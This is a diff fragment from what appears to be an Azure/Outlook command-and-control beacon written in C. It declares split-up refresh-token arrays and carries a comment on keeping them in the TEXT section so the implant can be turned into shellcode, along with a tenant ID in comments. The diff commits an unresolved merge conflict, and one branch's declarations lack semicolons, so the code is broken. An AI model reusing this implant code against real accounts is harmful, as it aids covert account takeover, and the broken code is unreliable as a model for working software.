@@ -113,6 +113,7 @@ void parseMetaCommand(msvcrtStruct strFuncs, char* command, metaCommandStruct* c
 
 int main() {
     // Variables
+<<<<<<< HEAD:Beacon/azureOutlookC2.c
     //char refreshToken[] = "REPLACE THIS";
     CHAR refreshToken1[] = {''};
     CHAR refreshToken2[] = {''};
@@ -121,6 +122,19 @@ int main() {
     CHAR refreshToken5[] = {''};
     CHAR refreshToken6[] = {''};
     CHAR refreshToken7[] = {''};
+=======
+    // If compiling to an EXE you can just use the one refreshToken array. If so, comment out rt array and lines 312 to 326
+    //char refreshToken[] = "REPLACE THIS";
+    // Put the Refresh token in these CHAR arrays. Had to break up the token to different arrays. 
+    // If it one massive array GCC ming will put it in the BSS section instead of the TEXT section. This will cause the shellcode creation to fail
+    CHAR refreshToken1[] = {''};
+    CHAR refreshToken2[] = {''}
+    CHAR refreshToken3[] = {''}
+    CHAR refreshToken4[] = {''}
+    CHAR refreshToken5[] = {''}
+    CHAR refreshToken6[] = {''}
+    CHAR refreshToken7[] = {''}
+>>>>>>> 5baf3846fb9c9b84dc72187ec29737d269fd5f78:azureOutlookC2.c
     //char tenantId[]     = "REPLACE THIS";
     //char tenantId[]     = "1d5551a0-f4f2-4101-9c3b-394247ec7e08";
     // bobby.cooke$ python3 string2Array.py tenantId "1d5551a0-f4f2-4101-9c3b-394247ec7e08"
